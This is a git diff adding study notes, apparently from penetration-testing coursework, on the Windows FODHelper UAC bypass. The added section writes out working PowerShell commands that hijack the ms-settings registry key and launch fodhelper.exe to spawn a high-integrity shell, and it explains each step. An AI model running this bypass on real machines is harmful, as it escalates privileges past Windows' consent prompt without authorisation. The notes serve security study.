@@ -688,6 +688,38 @@ Fodhelper.exe application.
 
 # FODHelper UAC bypass
 
+FODHelper tries to access
+`HKCU:\Software\Classes\ms-settings\shell\open\command`
+
+If our exploit creates the registry path and sets the (Default) value to an executable (like powershell.exe), it will be spawned as a high integrity process when Fodhelper is started.
+
+simulated in this powershell code
+
+(while running this this somehow disabled the visutal windows security app)
+```
+ New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
+
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force 
+
+C:\Windows\System32\fodhelper.exe
+```
+
+The first command creates the registry path through the New-Item cmdlet388 and the -Path
+option. Additionally, it sets the value of the default key to “powershell.exe” through the -Value
+option while the -Force flag suppresses any warnings.
+
+In the second command, the DelegateExecute value is created through the similar New-ItemProperty cmdlet,389 again using the -Path option along with the -Name option to specify the 
+value and the -PropertyType option to specify the type of value, in this case a String.
+
+Finally, fodhelper.exe is started to launch the high-integrity PowerShell prompt
+
+Based on the highlighted section of Figure 89, the PowerShell prompt is running in high integrity.
+This is obviously only a simple proof-of-concept but it has been weaponized by exploitation 
+frameworks including Metasploit so let’s test it out.
+
+
+
+
 
 
 
